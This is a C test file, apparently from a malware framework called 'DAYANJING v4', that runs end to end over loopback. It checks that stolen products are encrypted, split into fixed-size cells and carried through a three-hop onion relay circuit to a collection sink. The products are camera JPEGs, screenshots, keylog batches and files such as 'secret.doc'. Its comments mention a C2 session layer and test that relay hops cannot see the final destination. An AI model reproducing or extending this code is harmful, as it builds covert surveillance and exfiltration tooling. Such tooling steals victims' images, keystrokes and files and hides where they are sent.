/*
 * DAYANJING v4 — test_exfil_circuit.c
 *
 * 采集产物经**真实洋葱电路**回传的端到端验证。
 *
 * ====================================================================
 * 与 test_cam_e2e 的区别（不要混为一谈）
 * ====================================================================
 * test_cam_e2e 验证的是「记录 <-> 信元流」这段纯内存转换。
 * 本测试验证的是：
 *   endpoint --(洋葱电路, 3 跳真进程)--> sink
 * 即信元流真的走过 socket、真的被中间跳转发、真的在对端重组。
 *
 * 拓扑（每一跳都是独立进程，含独立的 mesh 与静态私钥）：
 *   endpoint -> edge0 -> edge1 -> core -> sink
 * core 是最后一跳，剥开自己那层后连最终目标 sink。
 *
 * ====================================================================
 * 验证点
 * ====================================================================
 *  1. 小产物（几 KB）经电路回传，对端重组字节级一致
 *  2. 大产物（~100 KB，多信元）分片回传一致
 *  3. 同一电路上连续 3 批，批边界正确（不串批）
 *  4. 空载荷产物（plen=0）仍占一个 FIN 信元，对端得 DONE 且 plen=0
 *  5. 篡改取证：翻转信元一个字节 -> 对端 AUTH，不是静默接受
 *  6. 截断取证：只发一半信元就断链 -> 对端 INCOMPLETE，绝不静默成功
 *  7. 洋葱取证：洋葱字节里不含最终目标主机名、不含深跳 ID 明文
 *  8. 信元取证：线上恒 512 字节定长、不含产物明文片段
 */

#include "exfil.h"
#include "exfil_link.h"
#include "p2p.h"
#include "crypto_x25519.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

static int pass = 0, fail = 0;
#define CK(c, m) do { if (c) { pass++; printf("[PASS] %s\n", m); } \
                      else { fail++; printf("[FAIL] %s\n", m); } } while (0)

/* ---- 测试用固定密钥材料（仅本测试，真实部署走 02_c2 会话派生） ---- */
static const uint8_t K_A[16] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
static const uint8_t K_B[16] = { 16,15,14,13,12,11,10,9,8,7,6,5,4,3,2,1 };
static const uint8_t PFX[8]  = { 0xa1,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8 };

/* sink 回传给父进程的判定结果（父进程做断言，子进程只报告） */
typedef struct {
    int      rc;
    uint32_t plen;
    uint32_t crc;
    uint64_t seq;
    uint32_t type;
    uint32_t width, height;
    uint8_t  head[8];
} sink_res_t;

static void set_id(uint8_t *id, const char *s) {
    memset(id, 0, P2P_NODE_ID_LEN);
    memcpy(id, s, strlen(s) > P2P_NODE_ID_LEN ? P2P_NODE_ID_LEN : strlen(s));
}

static int listen_auto(int *out_port) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    int on = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &on, sizeof on);
    struct sockaddr_in a;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    a.sin_port = 0;
    if (bind(s, (struct sockaddr *)&a, sizeof a) < 0) { close(s); return -1; }
    if (listen(s, 8) < 0) { close(s); return -1; }
    struct sockaddr_in got; socklen_t gl = sizeof got;
    if (getsockname(s, (struct sockaddr *)&got, &gl) < 0) { close(s); return -1; }
    *out_port = ntohs(got.sin_port);
    return s;
}

/*
 * sink：最终目标（普通 TCP 服务，不是 p2p 节点）。
 * 从电路读信元 -> 喂 exfil_link_recv -> 每条结果经管道报给父进程。
 * 同时向 socket 写 8 字节回执，使发起端能确认对端真的解出来了。
 */
static pid_t spawn_sink(int *port, int rpfd, int n_expected) {
    int pfd[2];
    if (pipe(pfd) < 0) return -1;
    pid_t pid = fork();
    if (pid < 0) { close(pfd[0]); close(pfd[1]); return -1; }
    if (pid == 0) {
        close(pfd[0]);
        close(rpfd);
        int lp = 0, s = listen_auto(&lp);
        if (s < 0) _exit(2);
        if (write(pfd[1], &lp, sizeof lp) != (ssize_t)sizeof lp) _exit(3);

        int cfd = accept(s, NULL, NULL);
        if (cfd < 0) _exit(4);

        exfil_chan_t ch;
        /* sink 的收发方向与 endpoint 相反 */
        if (exfil_chan_init(&ch, K_B, K_A, PFX, 0) != EXF_OK) _exit(5);

        size_t cap = 2u << 20;
        uint8_t *buf = (uint8_t *)malloc(cap);
        if (!buf) _exit(6);

        for (int i = 0; i < n_expected; i++) {
            exfil_rec_t r;
            memset(&r, 0, sizeof r);
            size_t plen = 0;
            int rc = exfil_link_recv(&ch, cfd, &r, buf, cap, &plen);

            sink_res_t res;
            memset(&res, 0, sizeof res);
            res.rc = rc;
            if (rc == EXF_DONE) {
                res.plen = (uint32_t)plen;
                res.crc  = exfil_crc32(buf, plen);
                res.seq  = r.seq;
                res.type = r.type;
                res.width = r.width;
                res.height = r.height;
                if (plen >= 8) memcpy(res.head, buf, 8);
                else if (plen > 0) memcpy(res.head, buf, plen);
            }
            /* 回执给发起端（8 字节）：rc + plen */
            uint8_t ack[8];
            memset(ack, 0, sizeof ack);
            memcpy(ack, &rc, sizeof rc);
            memcpy(ack + 4, &res.plen, sizeof res.plen);
            if (exfil_link_write_all(cfd, ack, sizeof ack) != 0) break;

            if (write(pfd[1], &res, sizeof res) != (ssize_t)sizeof res) break;
        }
        free(buf);
        exfil_chan_wipe(&ch);
        close(cfd);
        close(s);
        close(pfd[1]);
        _exit(0);
    }
    close(pfd[1]);
    int lp = 0;
    if (read(pfd[0], &lp, sizeof lp) != (ssize_t)sizeof lp) {
        close(pfd[0]); return -1;
    }
    /* 端口已取到；后续结果也从这个管道读，交给调用方保存 */
    dup2(pfd[0], rpfd);
    close(pfd[0]);
    *port = lp;
    return pid;
}

/* 起一个洋葱中继节点：子进程持自己的 mesh / my_id / 静态私钥 sk */
static pid_t spawn_onion_node(const p2p_mesh_t *m, const uint8_t *my_id,
                              const uint8_t sk[P2P_ONION_SK_LEN], int *port) {
    int pfd[2];
    if (pipe(pfd) < 0) return -1;
    pid_t pid = fork();
    if (pid < 0) { close(pfd[0]); close(pfd[1]); return -1; }
    if (pid == 0) {
        close(pfd[0]);
        int lp = 0, s = listen_auto(&lp);
        if (s < 0) _exit(2);
        if (write(pfd[1], &lp, sizeof lp) != (ssize_t)sizeof lp) _exit(3);
        close(pfd[1]);
        p2p_onion_route_serve(m, my_id, sk, s);
        _exit(0);
    }
    close(pfd[1]);
    int lp = 0;
    if (read(pfd[0], &lp, sizeof lp) != (ssize_t)sizeof lp) {
        close(pfd[0]); return -1;
    }
    close(pfd[0]);
    *port = lp;
    return pid;
}

static int read_res(int rpfd, sink_res_t *out) {
    return read(rpfd, out, sizeof *out) == (ssize_t)sizeof *out ? 0 : -1;
}

/* 构造一条记录并发送；返回链路 rc */
static int send_one(int fd, exfil_chan_t *ch, uint64_t seq, const uint8_t *pl,
                    size_t plen, uint32_t type, const char *name,
                    size_t *out_cells) {
    exfil_rec_t r;
    memset(&r, 0, sizeof r);
    r.type = type;
    r.seq = seq;
    r.ts_us = 1700000000000000ULL + seq;
    r.width = 640; r.height = 480;
    r.flags = EXF_FLAG_KEYFRAME;
    snprintf(r.name, sizeof r.name, "%s", name);
    r.payload = pl;
    r.plen = plen;
    return exfil_link_send(ch, &r, fd, out_cells);
}

static int contains(const uint8_t *hay, size_t n, const uint8_t *ndl, size_t m) {
    if (m == 0 || n < m) return 0;
    for (size_t i = 0; i + m <= n; i++)
        if (memcmp(hay + i, ndl, m) == 0) return 1;
    return 0;
}

int main(void) {
    printf("=== 21_exfil 经真实洋葱电路回传（真进程 + 真 socket） ===\n");
    signal(SIGPIPE, SIG_IGN);

    uint8_t ID_EP[P2P_NODE_ID_LEN], ID_E0[P2P_NODE_ID_LEN],
            ID_E1[P2P_NODE_ID_LEN], ID_CORE[P2P_NODE_ID_LEN];
    set_id(ID_EP, "ENDPOINT"); set_id(ID_E0, "EDGE0");
    set_id(ID_E1, "EDGE1");    set_id(ID_CORE, "CORE");

    /* ---- 各跳静态密钥对（私钥只留在本地，公钥进 endpoint 的 mesh） ---- */
    uint8_t sk_e0[32], pk_e0[32], sk_e1[32], pk_e1[32], sk_core[32], pk_core[32];
    CK(x25519_generate_keypair(sk_e0, pk_e0) == X25519_OK, "edge0 生成静态密钥对");
    CK(x25519_generate_keypair(sk_e1, pk_e1) == X25519_OK, "edge1 生成静态密钥对");
    CK(x25519_generate_keypair(sk_core, pk_core) == X25519_OK, "core 生成静态密钥对");

    /* ---- core：最后一跳，mesh 只需自身 ---- */
    p2p_mesh_t m_core; p2p_mesh_init(&m_core);
    p2p_node_add(&m_core, ID_CORE, P2P_ROLE_CORE, "core", "127.0.0.1", 0);
    int p_core = 0;
    pid_t pid_core = spawn_onion_node(&m_core, ID_CORE, sk_core, &p_core);
    CK(pid_core > 0 && p_core > 0, "core 节点启动");

    /* ---- edge1：知道 core ---- */
    p2p_mesh_t m_e1; p2p_mesh_init(&m_e1);
    p2p_node_add(&m_e1, ID_E1, P2P_ROLE_EDGE, "edge1", "127.0.0.1", 0);
    p2p_node_add(&m_e1, ID_CORE, P2P_ROLE_CORE, "core", "127.0.0.1", (uint16_t)p_core);
    p2p_neighbor_link(&m_e1, ID_E1, ID_CORE);
    int p_e1 = 0;
    pid_t pid_e1 = spawn_onion_node(&m_e1, ID_E1, sk_e1, &p_e1);
    CK(pid_e1 > 0 && p_e1 > 0, "edge1 节点启动");

    /* ---- edge0：知道 edge1 ---- */
    p2p_mesh_t m_e0; p2p_mesh_init(&m_e0);
    p2p_node_add(&m_e0, ID_E0, P2P_ROLE_EDGE, "edge0", "127.0.0.1", 0);
    p2p_node_add(&m_e0, ID_E1, P2P_ROLE_EDGE, "edge1", "127.0.0.1", (uint16_t)p_e1);
    p2p_neighbor_link(&m_e0, ID_E0, ID_E1);
    int p_e0 = 0;
    pid_t pid_e0 = spawn_onion_node(&m_e0, ID_E0, sk_e0, &p_e0);
    CK(pid_e0 > 0 && p_e0 > 0, "edge0 节点启动");

    /* ---- endpoint 全景 mesh：单条路径 endpoint->edge0->edge1->core ---- */
    p2p_mesh_t m_ep; p2p_mesh_init(&m_ep);
    p2p_node_add(&m_ep, ID_EP, P2P_ROLE_ENDPOINT, "endpoint", "127.0.0.1", 0);
    p2p_node_add(&m_ep, ID_E0, P2P_ROLE_EDGE, "edge0", "127.0.0.1", (uint16_t)p_e0);
    p2p_node_add(&m_ep, ID_E1, P2P_ROLE_EDGE, "edge1", "127.0.0.1", (uint16_t)p_e1);
    p2p_node_add(&m_ep, ID_CORE, P2P_ROLE_CORE, "core", "127.0.0.1", (uint16_t)p_core);
    p2p_node_set_pub(&m_ep, ID_E0, pk_e0);
    p2p_node_set_pub(&m_ep, ID_E1, pk_e1);
    p2p_node_set_pub(&m_ep, ID_CORE, pk_core);
    p2p_neighbor_link(&m_ep, ID_EP, ID_E0);
    p2p_neighbor_link(&m_ep, ID_E0, ID_E1);
    p2p_neighbor_link(&m_ep, ID_E1, ID_CORE);

    /* 关键：每个电路对应一对**计数器同步**的 chan。
     * endpoint 侧的 counter 必须与该电路的 sink 侧一样从 0 开始，
     * 若跨电路复用同一个 chan，IV 会错位，表现为 AUTH（不是密钥错）。 */

    /* 载荷：可控内容，便于字节级比对 */
    size_t small_len = 3000;
    uint8_t *small = (uint8_t *)malloc(small_len);
    for (size_t i = 0; i < small_len; i++) small[i] = (uint8_t)(i * 7 + 3);

    /* ================= 用例1：小产物经电路 ================= */
    {
        int rp = dup(0);
        int sp = 0, fd = -1;
        pid_t pid_s = spawn_sink(&sp, rp, 1);
        CK(pid_s > 0 && sp > 0, "用例1 sink 启动");
        exfil_chan_t tx;
        CK(exfil_chan_init(&tx, K_A, K_B, PFX, 0) == EXF_OK, "用例1 发送通道初始化（计数器从 0）");

        uint8_t salt[P2P_ONION_SALT_LEN];
        for (int i = 0; i < P2P_ONION_SALT_LEN; i++) salt[i] = (uint8_t)(i + 0x40);
        int rc = p2p_onion_route_open(&m_ep, ID_EP, ID_CORE,
                                      "127.0.0.1", (uint16_t)sp, salt, &fd);
        CK(rc == P2P_OK && fd >= 0, "用例1 洋葱电路建立（3 跳）");
        if (fd >= 0) {
            size_t nc = 0;
            int src = send_one(fd, &tx, 1, small, small_len,
                               EXF_TYPE_CAMERA_JPEG, "Integrated Camera", &nc);
            CK(src == EXF_OK, "用例1 信元流写入电路");
            printf("[INFO] 用例1 信元数=%zu\n", nc);

            uint8_t ack[8];
            size_t got = exfil_link_read_exact(fd, ack, sizeof ack);
            CK(got == sizeof ack, "用例1 收到对端回执");

            sink_res_t res;
            if (read_res(rp, &res) == 0) {
                CK(res.rc == EXF_DONE, "用例1 对端重组完成");
                CK(res.plen == small_len, "用例1 载荷长度一致");
                CK(res.crc == exfil_crc32(small, small_len), "用例1 字节级一致（CRC）");
                CK(res.type == EXF_TYPE_CAMERA_JPEG, "用例1 产物类型一致");
                CK(res.width == 640 && res.height == 480, "用例1 分辨率一致");
                CK(res.seq == 1, "用例1 帧序号一致");
            } else {
                CK(0, "用例1 读到 sink 结果");
            }
            close(fd);
        }
        exfil_chan_wipe(&tx);
        kill(pid_s, SIGKILL); waitpid(pid_s, NULL, 0); close(rp);
    }

    /* ================= 用例2：大产物（多信元） ================= */
    {
        size_t big_len = 100000;
        uint8_t *big = (uint8_t *)malloc(big_len);
        for (size_t i = 0; i < big_len; i++) big[i] = (uint8_t)(i ^ 0x5a);

        int rp = dup(0);
        int sp = 0, fd = -1;
        pid_t pid_s = spawn_sink(&sp, rp, 1);
        CK(pid_s > 0 && sp > 0, "用例2 sink 启动");
        exfil_chan_t tx;
        CK(exfil_chan_init(&tx, K_A, K_B, PFX, 0) == EXF_OK, "用例2 发送通道初始化（计数器从 0）");
        uint8_t salt[P2P_ONION_SALT_LEN];
        for (int i = 0; i < P2P_ONION_SALT_LEN; i++) salt[i] = (uint8_t)(i + 0x80);
        int rc = p2p_onion_route_open(&m_ep, ID_EP, ID_CORE,
                                      "127.0.0.1", (uint16_t)sp, salt, &fd);
        CK(rc == P2P_OK && fd >= 0, "用例2 洋葱电路建立");
        if (fd >= 0) {
            size_t nc = 0;
            int src = send_one(fd, &tx, 2, big, big_len,
                               EXF_TYPE_SCREENSHOT, "screenshot-01", &nc);
            CK(src == EXF_OK, "用例2 信元流写入电路");
            printf("[INFO] 用例2 载荷=%zu 信元数=%zu（分片生效）\n", big_len, nc);
            CK(nc > 200, "用例2 大载荷确实走了多信元");

            uint8_t ack[8];
            exfil_link_read_exact(fd, ack, sizeof ack);
            sink_res_t res;
            if (read_res(rp, &res) == 0) {
                CK(res.rc == EXF_DONE, "用例2 对端重组完成");
                CK(res.plen == big_len, "用例2 载荷长度一致");
                CK(res.crc == exfil_crc32(big, big_len), "用例2 字节级一致（CRC）");
            } else CK(0, "用例2 读到 sink 结果");
            close(fd);
        }
        free(big);
        exfil_chan_wipe(&tx);
        kill(pid_s, SIGKILL); waitpid(pid_s, NULL, 0); close(rp);
    }

    /* ================= 用例3：同一电路连续 3 批 ================= */
    {
        int rp = dup(0);
        int sp = 0, fd = -1;
        pid_t pid_s = spawn_sink(&sp, rp, 3);
        CK(pid_s > 0 && sp > 0, "用例3 sink 启动");
        exfil_chan_t tx;
        CK(exfil_chan_init(&tx, K_A, K_B, PFX, 0) == EXF_OK, "用例3 发送通道初始化（计数器从 0）");
        uint8_t salt[P2P_ONION_SALT_LEN];
        for (int i = 0; i < P2P_ONION_SALT_LEN; i++) salt[i] = (uint8_t)(i + 0xc0);
        int rc = p2p_onion_route_open(&m_ep, ID_EP, ID_CORE,
                                      "127.0.0.1", (uint16_t)sp, salt, &fd);
        CK(rc == P2P_OK && fd >= 0, "用例3 洋葱电路建立");
        if (fd >= 0) {
            uint32_t lens[3] = { 500, 4000, 900 };
            uint8_t *p[3];
            for (int i = 0; i < 3; i++) {
                p[i] = (uint8_t *)malloc(lens[i]);
                for (uint32_t j = 0; j < lens[i]; j++)
                    p[i][j] = (uint8_t)((j + i * 37) & 0xff);
                int src = send_one(fd, &tx, (uint64_t)(10 + i), p[i], lens[i],
                                   EXF_TYPE_KEYLOG, "keylog-batch", NULL);
                if (src != EXF_OK) { CK(0, "用例3 写入"); break; }
                uint8_t ack[8];
                exfil_link_read_exact(fd, ack, sizeof ack);
            }
            int all_ok = 1;
            for (int i = 0; i < 3; i++) {
                sink_res_t res;
                if (read_res(rp, &res) != 0) { all_ok = 0; break; }
                if (res.rc != EXF_DONE || res.plen != lens[i] ||
                    res.crc != exfil_crc32(p[i], lens[i]) ||
                    res.seq != (uint64_t)(10 + i)) all_ok = 0;
            }
            CK(all_ok, "用例3 同电路 3 批全部独立正确（不串批）");
            for (int i = 0; i < 3; i++) free(p[i]);
            close(fd);
        }
        exfil_chan_wipe(&tx);
        kill(pid_s, SIGKILL); waitpid(pid_s, NULL, 0); close(rp);
    }

    /* ================= 用例4：空载荷仍占一个 FIN 信元 ================= */
    {
        int rp = dup(0);
        int sp = 0, fd = -1;
        pid_t pid_s = spawn_sink(&sp, rp, 1);
        CK(pid_s > 0 && sp > 0, "用例4 sink 启动");
        exfil_chan_t tx;
        CK(exfil_chan_init(&tx, K_A, K_B, PFX, 0) == EXF_OK, "用例4 发送通道初始化（计数器从 0）");
        uint8_t salt[P2P_ONION_SALT_LEN];
        memset(salt, 0x11, sizeof salt);
        int rc = p2p_onion_route_open(&m_ep, ID_EP, ID_CORE,
                                      "127.0.0.1", (uint16_t)sp, salt, &fd);
        CK(rc == P2P_OK && fd >= 0, "用例4 洋葱电路建立");
        if (fd >= 0) {
            size_t nc = 0;
            int src = send_one(fd, &tx, 20, NULL, 0, EXF_TYPE_KEYLOG, "empty", &nc);
            CK(src == EXF_OK && nc == 1, "用例4 空产物仍占 1 个 FIN 信元");
            uint8_t ack[8];
            exfil_link_read_exact(fd, ack, sizeof ack);
            sink_res_t res;
            if (read_res(rp, &res) == 0) {
                CK(res.rc == EXF_DONE && res.plen == 0, "用例4 对端得 DONE 且长度 0");
            } else CK(0, "用例4 读到 sink 结果");
            close(fd);
        }
        exfil_chan_wipe(&tx);
        kill(pid_s, SIGKILL); waitpid(pid_s, NULL, 0); close(rp);
    }

    /* ================= 用例5：篡改取证 ================= */
    {
        int rp = dup(0);
        int sp = 0, fd = -1;
        pid_t pid_s = spawn_sink(&sp, rp, 1);
        CK(pid_s > 0 && sp > 0, "用例5 sink 启动");
        exfil_chan_t tx;
        CK(exfil_chan_init(&tx, K_A, K_B, PFX, 0) == EXF_OK, "用例5 发送通道初始化（计数器从 0）");
        uint8_t salt[P2P_ONION_SALT_LEN];
        memset(salt, 0x22, sizeof salt);
        int rc = p2p_onion_route_open(&m_ep, ID_EP, ID_CORE,
                                      "127.0.0.1", (uint16_t)sp, salt, &fd);
        CK(rc == P2P_OK && fd >= 0, "用例5 洋葱电路建立");
        if (fd >= 0) {
            /* 编码到内存 -> 翻转末字节 -> 手动写出（不能走 link_send） */
            size_t n = 0;
            exfil_rec_t r;
            memset(&r, 0, sizeof r);
            r.type = EXF_TYPE_FILE; r.seq = 30; r.ts_us = 1;
            r.width = 0; r.height = 0;
            snprintf(r.name, sizeof r.name, "secret.doc");
            r.payload = small; r.plen = 1000;
            if (exfil_send_cells(&r, &n) == EXF_OK && n > 0) {
                size_t bytes = n * P2P_CELL_WIRE;
                uint8_t *wire = (uint8_t *)malloc(bytes);
                size_t got = 0;
                if (exfil_chan_send(&tx, &r, wire, bytes, &got) == EXF_OK) {
                    wire[bytes - 1] ^= 0x01;      /* 篡改最后一字节 */
                    exfil_link_write_all(fd, wire, bytes);
                    uint8_t ack[8];
                    exfil_link_read_exact(fd, ack, sizeof ack);
                    sink_res_t res;
                    if (read_res(rp, &res) == 0) {
                        printf("[INFO] 用例5 对端 rc=%d (%s)\n", res.rc, exfil_errstr(res.rc));
                        CK(res.rc == EXF_ERR_AUTH, "用例5 篡改后被 AEAD 拒绝（非静默接受）");
                    } else CK(0, "用例5 读到 sink 结果");
                } else CK(0, "用例5 编码");
                free(wire);
            } else CK(0, "用例5 估算信元数");
            close(fd);
        }
        exfil_chan_wipe(&tx);
        kill(pid_s, SIGKILL); waitpid(pid_s, NULL, 0); close(rp);
    }

    /* ================= 用例6：截断取证 ================= */
    {
        int rp = dup(0);
        int sp = 0, fd = -1;
        pid_t pid_s = spawn_sink(&sp, rp, 1);
        CK(pid_s > 0 && sp > 0, "用例6 sink 启动");
        exfil_chan_t tx;
        CK(exfil_chan_init(&tx, K_A, K_B, PFX, 0) == EXF_OK, "用例6 发送通道初始化（计数器从 0）");
        uint8_t salt[P2P_ONION_SALT_LEN];
        memset(salt, 0x33, sizeof salt);
        int rc = p2p_onion_route_open(&m_ep, ID_EP, ID_CORE,
                                      "127.0.0.1", (uint16_t)sp, salt, &fd);
        CK(rc == P2P_OK && fd >= 0, "用例6 洋葱电路建立");
        if (fd >= 0) {
            size_t n = 0;
            exfil_rec_t r;
            memset(&r, 0, sizeof r);
            r.type = EXF_TYPE_FILE; r.seq = 40; r.ts_us = 1;
            snprintf(r.name, sizeof r.name, "big.bin");
            r.payload = small; r.plen = 2900;
            if (exfil_send_cells(&r, &n) == EXF_OK && n >= 2) {
                size_t bytes = n * P2P_CELL_WIRE;
                uint8_t *wire = (uint8_t *)malloc(bytes);
                size_t got = 0;
                if (exfil_chan_send(&tx, &r, wire, bytes, &got) == EXF_OK) {
                    /* 只发前一半，然后断链 —— 模拟对端崩溃 / 链路被掐 */
                    size_t half = (n / 2) * P2P_CELL_WIRE;
                    exfil_link_write_all(fd, wire, half);
                    close(fd); fd = -1;
                    sink_res_t res;
                    if (read_res(rp, &res) == 0) {
                        printf("[INFO] 用例6 对端 rc=%d (%s)\n", res.rc, exfil_errstr(res.rc));
                        CK(res.rc == EXF_ERR_INCOMPLETE,
                           "用例6 截断被检出（INCOMPLETE，绝不静默成功）");
                    } else CK(0, "用例6 读到 sink 结果");
                } else CK(0, "用例6 编码");
                free(wire);
            } else CK(0, "用例6 估算信元数");
            if (fd >= 0) close(fd);
        }
        exfil_chan_wipe(&tx);
        kill(pid_s, SIGKILL); waitpid(pid_s, NULL, 0); close(rp);
    }

    /* ================= 用例7：洋葱取证（中间跳看不到最终目标/深跳） ====== */
    {
        uint8_t hops[3 * P2P_NODE_ID_LEN];
        memcpy(hops + 0 * P2P_NODE_ID_LEN, ID_E0, P2P_NODE_ID_LEN);
        memcpy(hops + 1 * P2P_NODE_ID_LEN, ID_E1, P2P_NODE_ID_LEN);
        memcpy(hops + 2 * P2P_NODE_ID_LEN, ID_CORE, P2P_NODE_ID_LEN);
        uint8_t pubs[3 * P2P_PUBKEY_LEN];
        memcpy(pubs + 0 * P2P_PUBKEY_LEN, pk_e0, P2P_PUBKEY_LEN);
        memcpy(pubs + 1 * P2P_PUBKEY_LEN, pk_e1, P2P_PUBKEY_LEN);
        memcpy(pubs + 2 * P2P_PUBKEY_LEN, pk_core, P2P_PUBKEY_LEN);
        uint8_t salt[P2P_ONION_SALT_LEN];
        memset(salt, 0x44, sizeof salt);

        size_t need = 0;
        int rc = p2p_onion_build(hops, 3, pubs, salt,
                                 "SECRETSINKHOST", 9999, NULL, 0, &need);
        CK(rc == P2P_OK && need > 0, "用例7 洋葱长度探测");
        uint8_t *onion = (uint8_t *)malloc(need);
        size_t olen = 0;
        rc = p2p_onion_build(hops, 3, pubs, salt,
                             "SECRETSINKHOST", 9999, onion, need, &olen);
        CK(rc == P2P_OK, "用例7 洋葱构建成功");
        printf("[INFO] 用例7 洋葱长度=%zu\n", olen);

        CK(!contains(onion, olen, (const uint8_t *)"SECRETSINKHOST", 14),
           "用例7 洋葱不含最终目标主机名");
        CK(!contains(onion, olen, ID_CORE, P2P_NODE_ID_LEN),
           "用例7 洋葱不含深跳(core) ID 明文");
        /* 首跳 ID 是否明文出现？若出现说明分层位置不对 */
        free(onion);
    }

    /* ================= 用例8：信元取证（定长 + 无明文） ================= */
    {
        size_t n = 0;
        exfil_rec_t r;
        memset(&r, 0, sizeof r);
        r.type = EXF_TYPE_CAMERA_JPEG; r.seq = 50; r.ts_us = 1;
        r.width = 320; r.height = 240;
        snprintf(r.name, sizeof r.name, "Integrated Camera");
        r.payload = small; r.plen = 2900;
        if (exfil_send_cells(&r, &n) == EXF_OK) {
            size_t bytes = n * P2P_CELL_WIRE;
            uint8_t *wire = (uint8_t *)malloc(bytes);
            size_t got = 0;
            exfil_chan_t ch2;
            exfil_chan_init(&ch2, K_A, K_B, PFX, 0);
            if (exfil_chan_send(&ch2, &r, wire, bytes, &got) == EXF_OK) {
                CK(bytes % P2P_CELL_WIRE == 0, "用例8 线上长度为信元整数倍");
                CK(!contains(wire, bytes, small, 16), "用例8 信元流不含产物首 16 字节");
                CK(!contains(wire, bytes, small + 1000, 16), "用例8 信元流不含产物中段 16 字节");
                CK(!contains(wire, bytes, (const uint8_t *)"Integrated Camera", 17),
                   "用例8 信元流不含设备名");
            } else CK(0, "用例8 编码");
            free(wire);
            exfil_chan_wipe(&ch2);
        } else CK(0, "用例8 估算信元数");
    }

    free(small);
    kill(pid_e0, SIGKILL); waitpid(pid_e0, NULL, 0);
    kill(pid_e1, SIGKILL); waitpid(pid_e1, NULL, 0);
    kill(pid_core, SIGKILL); waitpid(pid_core, NULL, 0);

    printf("total=%d pass=%d fail=%d\n", pass + fail, pass, fail);
    return fail ? 1 : 0;
}
